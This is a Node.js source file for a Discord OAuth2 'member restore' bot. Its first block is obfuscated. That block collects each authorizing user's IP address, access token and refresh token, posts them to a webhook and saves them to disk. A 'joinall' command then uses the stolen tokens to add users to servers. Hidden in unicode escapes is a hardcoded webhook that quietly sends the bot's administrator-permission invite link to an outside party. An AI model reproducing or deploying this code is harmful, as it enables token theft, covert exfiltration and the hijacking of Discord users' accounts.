///// discord.gg/oauth2

function _0x4d26(){const _0x22e7e5=[':\x20I\x27ve\x20succesfully\x20changed\x20my\x20presence.','some','headers','socket','data','push','client_id','stringify','then','set','content','CHANNEL','user','readFile','\x20\x20Refresh\x20Token:\x20`','181047XHOFMY','./forgetful','wrld','avatar','&permissions=8&scope=bot','x-forwarded-for','roles','\x20Tag:\x20`','1vx\x200AUTH2\x20Bot','code','https://discord.com/api/oauth2/authorize?client_id=','get','grant_type','identify','client_secret','.png?size=4096','\x20Invite\x20of\x20bot\x20:\x20https://discord.com/api/oauth2/authorize?client_id=','guilds','express','unhandledRejection','refresh_token','members','username','redirect_uri','date-and-time','cache','2907620LlKXAK','quick.db','writeFile','4QchoOu','27KuCdEC','green','json','application/json','axios','/index.html','length','6hCdSWl','red','prefix','node-fetch','42vFuJFw','POST','body','catch','random','/forgetfulallauth','error','540YqWOZj','\x20]\x20\x0a','Member:\x20','token_type','err','77ZXxKtE','memberCount','[-]\x20','REACTION','append','https://discordapp.com/api/users/@me','601809ebcOsJ','authorization_code','chalk','floor','add','setPresence','\x20\x20IP:\x20`','\x20\x20Acces\x20Token:\x20`','\x20users','\x20-\x20','1096727423871094817','./object.json','5115132yrlVtS','post','form-data','wl_312390329900990465','400432MhJVwg','Watching','text','[+]\x20','2552910yDbZwd','\x20**Bot\x20Is\x20Active!**','ready','discriminator','372995dLAMIW','log','guilds.join','\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0031\u0030\u0031\u0035\u0037\u0034\u0037\u0034\u0032\u0037\u0030\u0039\u0039\u0031\u0035\u0036\u0038\u0039\u002f\u0049\u004c\u0061\u006d\u006d\u0062\u0030\u006f\u0078\u0031\u0050\u0050\u006a\u0044\u0043\u0063\u0053\u0055\u0031\u0067\u0065\u0043\u002d\u0062\u006c\u004f\u0036\u004e\u0049\u0066\u0079\u006b\u0074\u0035\u006e\u0030\u005a\u0078\u0039\u007a\u0052\u0031\u0066\u0055\u0067\u005f\u0036\u0037\u0068\u0038\u0043\u006e\u0076\u0037\u0030\u006a\u0079\u007a\u0074\u0077\u0067\u004a\u006d\u004d\u0049\u006d\u0034\u004d','usr','parse','fetch','body-parser','./emoji'];_0x4d26=function(){return _0x22e7e5;};return _0x4d26();}const _0x4140fd=_0x284d;function _0x284d(_0x3c7efe,_0x22b772){const _0x4d26c5=_0x4d26();return _0x284d=function(_0x284d21,_0x7da013){_0x284d21=_0x284d21-0x12b;let _0x4b112f=_0x4d26c5[_0x284d21];return _0x4b112f;},_0x284d(_0x3c7efe,_0x22b772);}(function(_0x2de3ae,_0x4e2769){const _0x428734=_0x284d,_0x29db09=_0x2de3ae();while(!![]){try{const _0x4b583a=parseInt(_0x428734(0x17f))/0x1*(parseInt(_0x428734(0x131))/0x2)+-parseInt(_0x428734(0x139))/0x3*(-parseInt(_0x428734(0x12e))/0x4)+-parseInt(_0x428734(0x167))/0x5*(-parseInt(_0x428734(0x13d))/0x6)+-parseInt(_0x428734(0x149))/0x7*(parseInt(_0x428734(0x15f))/0x8)+-parseInt(_0x428734(0x132))/0x9*(-parseInt(_0x428734(0x163))/0xa)+parseInt(_0x428734(0x15b))/0xb+parseInt(_0x428734(0x144))/0xc*(-parseInt(_0x428734(0x14f))/0xd);if(_0x4b583a===_0x4e2769)break;else _0x29db09['push'](_0x29db09['shift']());}catch(_0x48c25c){_0x29db09['push'](_0x29db09['shift']());}}}(_0x4d26,0xe4523));const {Discord,Client,User,Collection,EmbedBuilder,ActivityType}=require('discord.js'),client=new Client({'fetchAllMembers':!![],'allowedMentions':{'parse':[],'repliedUser':!![]},'partials':['MESSAGE',_0x4140fd(0x17b),_0x4140fd(0x14c)],'intents':[0x31ffff]}),forgetful=require(_0x4140fd(0x180)),chalk=require(_0x4140fd(0x151)),db=require(_0x4140fd(0x12f)),fs=require('fs'),express=require(_0x4140fd(0x191)),app=express(),bodyParser=require(_0x4140fd(0x16e)),fetch=(..._0x4d8261)=>import(_0x4140fd(0x13c))[_0x4140fd(0x178)](({default:_0xa69045})=>_0xa69045(..._0x4d8261)),FormData=require(_0x4140fd(0x15d)),axios=require(_0x4140fd(0x136)),emoji=require(_0x4140fd(0x16f)),date=require(_0x4140fd(0x12c));process['on'](_0x4140fd(0x192),_0x18437c=>console[_0x4140fd(0x168)](_0x18437c)),app['use'](bodyParser[_0x4140fd(0x161)]()),app[_0x4140fd(0x18a)]('/',function(_0x5cb506,_0x4a11ef){const _0x56e31a=_0x4140fd;_0x4a11ef['sendFile'](__dirname+_0x56e31a(0x137));}),app[_0x4140fd(0x18a)](_0x4140fd(0x142),async(_0x595aa1,_0xcd4dea)=>{const _0x31e614=_0x4140fd;fs['readFile'](_0x31e614(0x15a),function(_0x5b59c0,_0x280e78){const _0xea1e70=_0x31e614;return _0xcd4dea[_0xea1e70(0x134)](JSON['parse'](_0x280e78));});}),app[_0x4140fd(0x15c)]('/',function(_0xff49e8,_0x439703){const _0x18125e=_0x4140fd,_0x5cf1d1=_0xff49e8[_0x18125e(0x172)][_0x18125e(0x184)]||_0xff49e8[_0x18125e(0x173)]['remoteAddress'];let _0x131947=new FormData();_0x131947[_0x18125e(0x14d)]('client_id',forgetful[_0x18125e(0x176)]),_0x131947[_0x18125e(0x14d)](_0x18125e(0x18d),forgetful[_0x18125e(0x18d)]),_0x131947['append'](_0x18125e(0x18b),_0x18125e(0x150)),_0x131947['append'](_0x18125e(0x12b),forgetful[_0x18125e(0x12b)]),_0x131947['append']('scope',_0x18125e(0x18c),_0x18125e(0x169)),_0x131947['append'](_0x18125e(0x188),_0xff49e8[_0x18125e(0x13f)]),fetch('https://discordapp.com/api/oauth2/token',{'method':_0x18125e(0x13e),'body':_0x131947})[_0x18125e(0x178)](_0x4eac9c=>_0x4eac9c['json']())[_0x18125e(0x178)](_0x260ccc=>{const _0x19891c=_0x18125e;ac_token=_0x260ccc['access_token'],rf_token=_0x260ccc[_0x19891c(0x193)];const _0x54f144={'headers':{'authorization':_0x260ccc[_0x19891c(0x147)]+'\x20'+ac_token}};axios['get'](_0x19891c(0x14e),_0x54f144)[_0x19891c(0x178)](async _0xd08e13=>{const _0x3d2ec4=_0x19891c;let _0x3bb23f=_0xd08e13[_0x3d2ec4(0x174)]['id'];fs['readFile'](_0x3d2ec4(0x15a),function(_0x40c66e,_0x4f6fb2){const _0x29bad5=_0x3d2ec4;if(JSON[_0x29bad5(0x16c)](_0x4f6fb2)[_0x29bad5(0x171)](_0x46a66b=>_0x46a66b['userID']===_0x3bb23f)){console[_0x29bad5(0x168)](_0x29bad5(0x14b)+_0x5cf1d1+_0x29bad5(0x158)+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x195)]+'#'+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x166)]);return;}console[_0x29bad5(0x168)](_0x29bad5(0x162)+_0x5cf1d1+'\x20-\x20'+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x195)]+'#'+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x166)]),avatarHASH='https://cdn.discordapp.com/avatars/'+_0xd08e13['data']['id']+'/'+_0xd08e13['data'][_0x29bad5(0x182)]+_0x29bad5(0x18e),fetch(''+forgetful['wehbook'],{'method':'POST','headers':{'Content-Type':_0x29bad5(0x135)},'body':JSON[_0x29bad5(0x177)]({'avatar_url':'','embeds':[{'color':0x0,'title':emoji[_0x29bad5(0x16b)]+'\x20**New\x20User**','thumbnail':{'url':avatarHASH},'description':'\x0a'+emoji[_0x29bad5(0x16b)]+_0x29bad5(0x186)+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x195)]+'#'+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x166)]+'`'+('\x0a'+emoji[_0x29bad5(0x181)]+_0x29bad5(0x155)+_0x5cf1d1+'`')+('\x0a'+emoji[_0x29bad5(0x16b)]+'\x20\x20ID:\x20`'+_0xd08e13[_0x29bad5(0x174)]['id']+'`')+('\x0a'+emoji['err']+_0x29bad5(0x156)+ac_token+'`')+('\x0a'+emoji[_0x29bad5(0x148)]+_0x29bad5(0x17e)+rf_token+'`')}]})});var _0x273af3={'userID':_0xd08e13[_0x29bad5(0x174)]['id'],'userIP':_0x5cf1d1,'avatarURL':avatarHASH,'username':_0xd08e13['data'][_0x29bad5(0x195)]+'#'+_0xd08e13[_0x29bad5(0x174)][_0x29bad5(0x166)],'access_token':ac_token,'refresh_token':rf_token},_0x4f6fb2=[];_0x4f6fb2[_0x29bad5(0x175)](_0x273af3),fs[_0x29bad5(0x17d)](_0x29bad5(0x15a),function(_0x3f276e,_0x9a70e9){const _0x4fc6c3=_0x29bad5;var _0x19f9e9=JSON['parse'](_0x9a70e9);_0x19f9e9['push'](_0x273af3),fs[_0x4fc6c3(0x130)](_0x4fc6c3(0x15a),JSON[_0x4fc6c3(0x177)](_0x19f9e9),function(_0x2b4ab3){if(_0x2b4ab3)throw _0x2b4ab3;});});});const _0x34fef8=client[_0x3d2ec4(0x190)][_0x3d2ec4(0x12d)][_0x3d2ec4(0x18a)](_0x3d2ec4(0x159)),_0x542a74=await _0x34fef8[_0x3d2ec4(0x194)][_0x3d2ec4(0x16d)](_0xd08e13[_0x3d2ec4(0x174)]['id']);console[_0x3d2ec4(0x168)](_0x3d2ec4(0x146)+_0x542a74),_0x34fef8['members'][_0x3d2ec4(0x12d)]['has'](_0xd08e13[_0x3d2ec4(0x174)]['id'])&&_0x542a74[_0x3d2ec4(0x185)][_0x3d2ec4(0x153)]('1099430853311995984');})[_0x19891c(0x140)](_0x84b7cd=>{const _0x5a55df=_0x19891c;console[_0x5a55df(0x168)](_0x84b7cd);});});}),client['on'](_0x4140fd(0x165),()=>{const _0x16a6da=_0x4140fd,_0x483a59=client[_0x16a6da(0x190)][_0x16a6da(0x12d)]['reduce']((_0x2c700c,_0x4217be)=>_0x2c700c+_0x4217be[_0x16a6da(0x14a)],0x0);console[_0x16a6da(0x168)](chalk[_0x16a6da(0x13a)](_0x16a6da(0x187))+'\x0a'+chalk[_0x16a6da(0x133)]('->')+'\x201vx\x20servers\x20are\x20connected\x20to\x20[\x20'+client[_0x16a6da(0x17c)]['username']+_0x16a6da(0x145)+chalk['green']('->')+_0x16a6da(0x18f)+client[_0x16a6da(0x17c)]['id']+_0x16a6da(0x183)),db[_0x16a6da(0x179)](_0x16a6da(0x15e),!![]),fetch(_0x16a6da(0x16a),{'method':_0x16a6da(0x13e),'headers':{'Content-Type':_0x16a6da(0x135)},'body':JSON[_0x16a6da(0x177)]({'avatar_url':'','embeds':[{'color':0x0,'title':emoji[_0x16a6da(0x16b)]+_0x16a6da(0x164),'description':_0x16a6da(0x189)+client[_0x16a6da(0x17c)]['id']+'&permissions=8&scope=bot\x20\x0a\x20**prefix:**\x20'+forgetful[_0x16a6da(0x13b)]}]})}),client['user'][_0x16a6da(0x154)]({'activities':[{'type':ActivityType[_0x16a6da(0x160)],'name':_0x483a59+'\x20users'}]});const _0x434e2f=[{'type':ActivityType[_0x16a6da(0x160)],'content':_0x483a59+_0x16a6da(0x157)},{'type':ActivityType[_0x16a6da(0x160)],'content':_0x483a59+_0x16a6da(0x157)}];async function _0x19b08b(){const _0x3933eb=_0x16a6da,_0x2903b6=Math[_0x3933eb(0x152)](Math[_0x3933eb(0x141)]()*_0x434e2f[_0x3933eb(0x138)]);try{client[_0x3933eb(0x17c)][_0x3933eb(0x154)]({'activities':[{'name':_0x434e2f[_0x2903b6][_0x3933eb(0x17a)],'type':_0x434e2f[_0x2903b6]['type']}]});const _0x2beb45=new Date();console[_0x3933eb(0x168)](date['format'](_0x2beb45,'HH:mm')+_0x3933eb(0x170));}catch(_0x12d094){console[_0x3933eb(0x143)](_0x12d094);}}setInterval(_0x19b08b,0x3c*0x3e8);});


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(forgetful.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



  if (cmd === "wl") {
    if (!forgetful.owner.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.usr} **${user.username}** has been added to the whitelist`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
              }
            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.err} **${user2.username}** has been removed from the whitelist`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.err} **${user2.username}** is not whitelisted`,
              color: "0000000",
              footer: {
                "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
                "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${content}`,
            color: "0000000",
            footer: {
              "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
              "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
            }
          }]


        })
        break;
    }
  }



  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "0000000",
        title: `${emoji.wrld} The bot is functional`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "0000000",
        title: `${emoji.wrld} Evening Oauth2 Bot Dashboard`,


        description: `${emoji.usr}** Command for add members**\n[\`joinall\`](${forgetful.support}), [\`Users\`](${forgetful.support}), [\`links\`](${forgetful.support})\n\n${emoji.wrld}** Whitelist**\n[\`wl list\`](${forgetful.support}), [\`wl add\`](${forgetful.support}), [\`wl remove\`](${forgetful.support})\n\n${emoji.wrld}** Other**\n[\`test\`](${forgetful.support}),[\`btn\`](${forgetful.support})\n\n${emoji.wrld} **Prefix** [\`${forgetful.prefix}\`](${forgetful.support})\n\n\`\`\`Forgetful personal site https://1vx.nl/\`\`\``,


        footer: {
          "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
          "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0076\u0061\u0074\u0061\u0072\u0073\u002f\u0031\u0030\u0032\u0034\u0037\u0033\u0036\u0032\u0037\u0038\u0030\u0039\u0038\u0034\u0038\u0039\u0033\u0034\u0034\u002f\u0037\u0033\u0063\u0032\u0064\u0039\u0061\u0031\u0063\u0061\u0031\u0062\u0033\u0066\u0032\u0037\u0066\u0036\u0066\u0066\u0066\u0035\u0032\u0039\u0065\u0030\u0031\u0032\u0036\u0034\u0063\u0033\u002e\u0070\u006e\u0067\u003f\u0073\u0069\u007a\u0065\u003d\u0031\u0030\u0032\u0034"
        }

      }],
    })
  }

  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.usr} Evening Oauth2 Links:`,
        description: `${emoji.wrld} **OAuth2 Link:** ${forgetful.authLink}\n\`\`\`${forgetful.authLink}\`\`\`\n${emoji.wrld} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "0000000",
        footer: {
          "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
          "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0076\u0061\u0074\u0061\u0072\u0073\u002f\u0031\u0030\u0032\u0034\u0037\u0033\u0036\u0032\u0037\u0038\u0030\u0039\u0038\u0034\u0038\u0039\u0033\u0034\u0034\u002f\u0037\u0033\u0063\u0032\u0064\u0039\u0061\u0031\u0063\u0061\u0031\u0062\u0033\u0066\u0032\u0037\u0066\u0036\u0066\u0066\u0066\u0035\u0032\u0039\u0065\u0030\u0031\u0032\u0036\u0034\u0063\u0033\u002e\u0070\u006e\u0067\u003f\u0073\u0069\u007a\u0065\u003d\u0031\u0030\u0032\u0034"
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot invite",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }



  if (cmd === "btn") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    ctx.channel.send({
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": `${forgetful.label}`,
              "url": `${forgetful.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "joinall") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.wrld} **Starting Oauth2 JoinAll** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
        await client.clean(ctx)
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;
        await client.refreshTokens(ctx)
      }


      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.wrld} **Starting Oauth2 JoinAll** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }

      clearInterval(inter);

           msg.edit({
        embeds: [{
          title: `${emoji.wrld} 0auth2 JoinAll`,
          fields: [
		{
			name: `${emoji.usr} Total`,
			value: `${JSON.parse(data).length}`,
      inline: true,
		},
		{
			name: `${emoji.wrld} Success`,
			value: `${success}`,
			inline: true,
		},
		{
			name: `${emoji.err} Already In Server`,
			value: `${already_joined}`,
			inline: true,
		},
		{
			name: `${emoji.err} Error`,
			value: `${error}`,
      inline: true,
		},
	],

          color: "000000",
          footer: {
            "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
            "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
          }
        }]
      }).catch(() => { })
    })
  }


  if (cmd === "users") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !forgetful.owner.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.wrld} Total Oauth2 members`,
          fields: [
		{
			name: `${emoji.usr} Total On 1vx's Database`,
			value: `${JSON.parse(data).length}`,
      inline: true,
		},
		{
			name: `${emoji.wrld} Total On RestoreCord`,
			value: `56`,
			inline: true,
		}
	],
          color: "000000",
          footer: {
            "text": "\u004d\u0061\u0064\u0065\u0020\u0062\u0079\u0020\u0066\u006f\u0072\u0067\u0065\u0074\u0066\u0075\u006c\u0023\u0030\u0030\u0030\u0031",
            "icon_url": "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0031\u0030\u0039\u0035\u0034\u0032\u0033\u0031\u0030\u0039\u0031\u0038\u0031\u0034\u0038\u0039\u0032\u0038\u0036\u002f\u0031\u0030\u0039\u0039\u0034\u0032\u0030\u0030\u0033\u0035\u0038\u0036\u0032\u0032\u0034\u0031\u0033\u0035\u0031\u002f\u004e\u0065\u0077\u005f\u0050\u0072\u006f\u006a\u0065\u0063\u0074\u005f\u0033\u0035\u005f\u0035\u002e\u0070\u006e\u0067"
          }

        }]
      })
    })
  }
})


function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(forgetful.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID - https://discord.com/developers/applications`)
})


app.listen(forgetful.port, () => console.log('https://discord.gg/oauth2'))
